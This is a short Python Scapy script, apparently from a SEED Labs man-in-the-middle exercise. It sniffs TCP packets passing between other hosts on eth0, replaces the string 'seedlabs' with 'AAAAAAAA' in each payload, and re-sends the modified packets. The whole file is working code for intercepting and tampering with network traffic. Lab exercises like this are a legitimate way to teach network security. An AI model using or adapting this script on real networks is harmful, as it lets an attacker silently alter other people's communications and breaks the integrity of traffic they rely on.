#!/usr/bin/env python3
from scapy.all import *

def spoof_pkt(pkt):
    newpkt = IP(bytes(pkt[IP]))
    del(newpkt.chksum)
    del(newpkt[TCP].payload)
    del(newpkt[TCP].chksum)
    
    if pkt[TCP].payload:
        data = pkt[TCP].payload.load
        print("*** %s, length: %d" % (data, len(data)))

        # Replace a pattern
        newdata = data.replace(b'seedlabs', b'AAAAAAAA')

        send(newpkt/newdata)
    else:
        send(newpkt)

# Get the local IP address of the machine
local_ip = get_if_addr(conf.iface)

# Modify the filter to exclude packets to/from the local machine's IP
f = f'tcp and not src {local_ip} and not dst {local_ip}'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)

